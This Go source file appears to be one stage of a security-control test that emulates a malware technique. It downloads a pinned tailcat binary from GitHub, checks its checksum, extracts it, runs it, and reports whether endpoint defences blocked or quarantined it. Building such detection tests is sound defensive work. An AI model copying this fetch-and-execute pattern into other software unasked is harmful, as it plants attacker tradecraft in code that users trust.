// Stage 1 — T1105 Ingress Tool Transfer (tactic: command-and-control)
//
// Kothamine variants download tailcat/Tailscale networking components from the
// official GitHub releases at runtime. This stage mirrors that: it downloads
// the pinned tailcat v0.7.0 static binary for the run-time platform from
// GitHub into LOG_DIR, verifies the archive SHA256 against the checksums
// pinned at authoring time, extracts the binary, and proves it runs
// (`tailcat --version`).
//
// CLASSIFICATION INTEGRITY (CLAUDE.md Bug Prevention Rules 1/3/8):
//   - GitHub unreachable / no internet egress / checksum mismatch are
//     PREREQUISITE failures → 999, never a block verdict.
//   - 105 only on positive evidence: the extracted binary disappears when
//     re-checked with os.Stat after a 3s settle window (quarantine).
//   - 126 only on an OS-emitted denial when executing the extracted binary
//     (or 127 if the binary vanishes right after a successful execution).
//
// Exit codes: 0 = tailcat downloaded, extracted, and executed,
//             105 = binary quarantined on extraction (os.Stat evidence),
//             126 = execution of the binary denied by the OS,
//             127 = binary quarantined during/after execution,
//             999 = prerequisite/ambiguous failure.

//go:build windows || linux

package main

import (
	"archive/tar"
	"archive/zip"
	"compress/gzip"
	"context"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

const (
	TEST_UUID      = "c37d6a01-3934-4e72-9cb1-3dae284b937b"
	TECHNIQUE_ID   = "T1105"
	TECHNIQUE_NAME = "Ingress Tool Transfer (tailcat download)"
	STAGE_ID       = 1
)

const downloadTimeout = 180 * time.Second

func main() {
	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Starting %s", TECHNIQUE_NAME))
	LogStageStart(STAGE_ID, TECHNIQUE_ID, TECHNIQUE_NAME)

	code, detail := runStage()

	switch code {
	case StageSuccess:
		fmt.Printf("[STAGE %s] %s\n", TECHNIQUE_ID, detail)
		LogMessage("SUCCESS", TECHNIQUE_ID, detail)
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success", detail)
	case StageBlocked, StageQuarantined, StageQuarantinedOnExec:
		fmt.Printf("[STAGE %s] %s\n", TECHNIQUE_ID, detail)
		LogMessage("WARN", TECHNIQUE_ID, detail)
		LogStageBlocked(STAGE_ID, TECHNIQUE_ID, detail)
	default:
		fmt.Printf("[STAGE %s] %s\n", TECHNIQUE_ID, detail)
		LogMessage("ERROR", TECHNIQUE_ID, detail)
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", detail)
	}
	os.Exit(code)
}

func runStage() (int, string) {
	if err := os.MkdirAll(LOG_DIR, 0755); err != nil {
		return StageError, fmt.Sprintf("LOG_DIR %s not provisioned: %v", LOG_DIR, err)
	}

	asset, err := tailcatAssetForPlatform()
	if err != nil {
		return StageError, err.Error()
	}

	// --- Download the pinned release asset from GitHub ---
	archivePath := filepath.Join(LOG_DIR, filepath.Base(asset.URL))
	defer os.Remove(archivePath)

	fmt.Printf("[STAGE %s] Downloading %s\n", TECHNIQUE_ID, asset.URL)
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Downloading tailcat v%s asset: %s", TailcatVersion, asset.URL))

	archiveData, err := downloadFile(asset.URL)
	if err != nil {
		// Network egress failure is a prerequisite problem, not a block.
		return StageError, fmt.Sprintf("tailcat download failed (no internet egress or GitHub unreachable): %v", err)
	}
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Downloaded %d bytes", len(archiveData)))

	// --- Integrity check against the pinned checksum ---
	if sum := sha256Bytes(archiveData); !strings.EqualFold(sum, asset.SHA256) {
		return StageError, fmt.Sprintf("archive SHA256 mismatch (got %s, pinned %s) — download integrity failure", sum, asset.SHA256)
	}
	LogMessage("INFO", TECHNIQUE_ID, "Archive SHA256 matches pinned v0.7.0 checksum")

	if err := os.WriteFile(archivePath, archiveData, 0644); err != nil {
		return StageError, fmt.Sprintf("could not write downloaded archive: %v", err)
	}
	LogFileDropped(filepath.Base(archivePath), archivePath, int64(len(archiveData)), false)

	// --- Extract the tailcat binary into LOG_DIR ---
	binPath := tailcatPath()
	if err := extractTailcat(archivePath, binPath); err != nil {
		return StageError, fmt.Sprintf("failed to extract tailcat binary: %v", err)
	}
	if fi, err := os.Stat(binPath); err == nil {
		LogFileDropped(tailcatBinaryName(), binPath, fi.Size(), false)
	}
	fmt.Printf("[STAGE %s] Extracted %s\n", TECHNIQUE_ID, binPath)

	// --- Quarantine check: give a control a settle window, then re-stat ---
	time.Sleep(3 * time.Second)
	if _, err := os.Stat(binPath); os.IsNotExist(err) {
		return StageQuarantined, "extracted tailcat binary removed from disk after 3s settle window (os.Stat confirms quarantine)"
	}

	// --- Prove the binary runs ---
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	out, code, runErr := runCaptured(ctx, tailcatBinaryName(), exec.CommandContext(ctx, binPath, "--version"), tailcatBinaryName()+"_version_output.txt")
	if runErr != nil {
		return classifyExecError(runErr), fmt.Sprintf("tailcat binary could not execute: %v", runErr)
	}
	if code != 0 {
		// A non-zero exit right after a successful extraction: check whether the
		// binary vanished during execution (quarantine-on-execution evidence).
		if _, err := os.Stat(binPath); os.IsNotExist(err) {
			return StageQuarantinedOnExec, "tailcat binary removed from disk during execution attempt (os.Stat confirms quarantine)"
		}
		return StageError, fmt.Sprintf("tailcat --version exited %d with output: %s", code, strings.TrimSpace(out))
	}
	if !strings.Contains(out, TailcatVersion) {
		return StageError, fmt.Sprintf("unexpected tailcat version output: %s", strings.TrimSpace(out))
	}

	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("tailcat --version output: %s", strings.TrimSpace(out)))
	return StageSuccess, fmt.Sprintf("tailcat v%s downloaded from GitHub, extracted to %s, and executed", TailcatVersion, binPath)
}

// downloadFile fetches url with a bounded client. Redirects (GitHub release
// assets 302 to a CDN) are followed by default.
func downloadFile(url string) ([]byte, error) {
	client := &http.Client{Timeout: downloadTimeout}
	resp, err := client.Get(url)
	if err != nil {
		return nil, fmt.Errorf("GET %s: %v", url, err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("GET %s returned HTTP %d", url, resp.StatusCode)
	}
	data, err := io.ReadAll(io.LimitReader(resp.Body, 64<<20))
	if err != nil {
		return nil, fmt.Errorf("reading %s: %v", url, err)
	}
	return data, nil
}

// extractTailcat extracts the tailcat binary from the release archive
// (zip on Windows, tar.gz on Linux) to destPath with mode 0755.
func extractTailcat(archivePath, destPath string) error {
	if strings.HasSuffix(archivePath, ".zip") {
		return extractFromZip(archivePath, destPath)
	}
	return extractFromTarGz(archivePath, destPath)
}

func extractFromZip(archivePath, destPath string) error {
	r, err := zip.OpenReader(archivePath)
	if err != nil {
		return fmt.Errorf("failed to open zip: %v", err)
	}
	defer r.Close()
	for _, f := range r.File {
		if filepath.Base(f.Name) != tailcatBinaryName() {
			continue
		}
		rc, err := f.Open()
		if err != nil {
			return fmt.Errorf("failed to open %s in zip: %v", f.Name, err)
		}
		defer rc.Close()
		return writeExecutable(destPath, rc)
	}
	return fmt.Errorf("%s not found in zip archive", tailcatBinaryName())
}

func extractFromTarGz(archivePath, destPath string) error {
	f, err := os.Open(archivePath)
	if err != nil {
		return fmt.Errorf("failed to open archive: %v", err)
	}
	defer f.Close()
	gz, err := gzip.NewReader(f)
	if err != nil {
		return fmt.Errorf("failed to open gzip stream: %v", err)
	}
	defer gz.Close()
	tr := tar.NewReader(gz)
	for {
		hdr, err := tr.Next()
		if err == io.EOF {
			break
		}
		if err != nil {
			return fmt.Errorf("failed to read tar: %v", err)
		}
		if hdr.Typeflag == tar.TypeReg && filepath.Base(hdr.Name) == tailcatBinaryName() {
			return writeExecutable(destPath, tr)
		}
	}
	return fmt.Errorf("%s not found in tar.gz archive", tailcatBinaryName())
}

func writeExecutable(destPath string, src io.Reader) error {
	out, err := os.OpenFile(destPath, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0755)
	if err != nil {
		return fmt.Errorf("failed to create %s: %v", destPath, err)
	}
	defer out.Close()
	if _, err := io.Copy(out, src); err != nil {
		return fmt.Errorf("failed to write %s: %v", destPath, err)
	}
	return nil
}
